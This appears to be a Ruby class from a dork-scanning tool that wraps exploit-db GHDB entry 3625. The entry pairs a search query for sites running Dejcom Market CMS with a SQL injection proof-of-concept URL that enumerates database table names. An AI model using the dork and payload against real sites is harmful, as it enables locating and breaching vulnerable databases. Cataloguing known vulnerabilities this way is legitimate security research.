module Dorks
   class Dork3625 < Vulpes::Dork

      def initialize
         super({
            name: "Dork 3625",
            ghdb_url: "https://www.exploit-db.com/ghdb/3625",
            severity: "4",
            category: "advisories_and_vulnerabilities",
            publish_date: "2010-12-04",
            author: "anonymous",
            dork: <<~EDORK,
"Powered By Dejcom Market CMS"
EDORK
            description: <<~EDESC
Submitter:Mormoroth PoC: http://server/showbrand.aspx?bc=%27 or 1=(select top 1 table_name from information_schema.tables where table_name not in('bill','billdetail','cart','charge'))--
EDESC
         })

      end
   end
end
